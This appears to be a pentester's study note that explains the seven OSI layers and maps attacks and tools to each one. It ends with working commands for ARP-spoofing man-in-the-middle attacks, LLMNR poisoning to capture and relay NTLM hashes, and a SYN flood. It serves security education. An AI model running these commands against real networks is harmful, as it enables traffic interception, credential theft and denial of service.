# OSI Model

The OSI (Open Systems Interconnection) model splits network communication into seven layers. Pentesters use it to pinpoint where attacks and defenses apply - sniffing at Layer 2, routing at Layer 3, firewalls at Layer 4, and app bugs at Layer 7.

![OSI Model - seven layers from Physical to Application](resource/osi-model-diagram.png)

The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes the functions of a telecommunication or computing system into seven abstraction layers. This model helps in understanding how different networking protocols and technologies interact and communicate with each other. Each layer of the OSI model serves a specific purpose and communicates with the layers above and below it.

Let's break down the seven layers of the OSI model from the bottom up:

## Physical Layer (Layer 1)

The physical layer deals with the actual physical connection between devices. It defines the hardware elements such as cables, connectors, and the transmission of raw bits over a physical medium. Examples include Ethernet cables, fiber optics, and wireless transmission.
## Data Link Layer (Layer 2)

This layer is responsible for creating a reliable link between two directly connected nodes. It involves the framing of data into frames, error detection, and correction. Ethernet and Wi-Fi operate at this layer, ensuring data integrity within a local network.
## Network Layer (Layer 3)

The network layer is concerned with the logical addressing and routing of data between different networks. Internet Protocol (IP) is a key protocol at this layer, and routers operate at the network layer to determine the best path for data to travel across different networks.
## Transport Layer (Layer 4)

The transport layer ensures end-to-end communication between devices. It is responsible for error detection, flow control, and retransmission of data if necessary. Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) are commonly used at this layer.
## Session Layer (Layer 5)

The session layer manages sessions or connections between applications on different devices. It establishes, maintains, and terminates connections, allowing for dialogue control and synchronization between applications. This layer ensures that data is exchanged properly between applications.
## Presentation Layer (Layer 6)

The presentation layer is responsible for translating data between the application layer and the lower layers. It deals with data formatting, encryption, and compression. It ensures that data is in a readable format for the application layer.
## Application Layer (Layer 7)

The application layer is the topmost layer and is closest to the end-user. It provides network services directly to user applications. Examples include web browsers, email clients, and file transfer protocols. This layer interacts directly with software applications.

Understanding the OSI model helps in troubleshooting network issues, designing networks, and developing interoperable networking protocols. Each layer has a specific role, and the model as a whole provides a systematic approach to understanding and implementing network communication.

---

## Attacks mapped to each layer

Thinking in layers helps you choose the right attack and the right tool.

| Layer | Example attacks | Tools |
|-------|-----------------|-------|
| 7 Application | SQLi, XSS, RCE, auth bypass | Burp, sqlmap, nuclei |
| 6 Presentation | SSL/TLS downgrade, weak ciphers, padding oracle | testssl.sh, sslscan |
| 5 Session | Session hijacking, fixation | Burp |
| 4 Transport | SYN flood, port scanning, TCP RST injection | nmap, hping3 |
| 3 Network | IP spoofing, ICMP tunneling, routing attacks | scapy, hping3 |
| 2 Data Link | ARP spoofing, MAC flooding, VLAN hopping, LLMNR/NBT-NS poisoning | ettercap, bettercap, Responder, macof |
| 1 Physical | Cable tapping, rogue devices, keystroke injection | Rubber Ducky, LAN Turtle |

### Layer 2 example — ARP spoofing (MITM)

```bash
# Enable forwarding then poison both directions
echo 1 > /proc/sys/net/ipv4/ip_forward
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"

# Classic ettercap MITM
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//
```

### Layer 2 example — LLMNR/NBT-NS poisoning (steal NTLM hashes)

```bash
responder -I eth0 -wF
# Captured NetNTLMv2 hashes -> crack with hashcat -m 5600 or relay with ntlmrelayx
```

### Layer 4 — scanning and SYN flood (lab only)

```bash
nmap -sS -p- target                      # SYN scan
hping3 -S --flood -p 80 target           # SYN flood (authorized testing only)
```

## Related

- [Common Protocols](Common%20Protocols.md)
- [Wireshark](../Tools/Wireshark.md) · [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
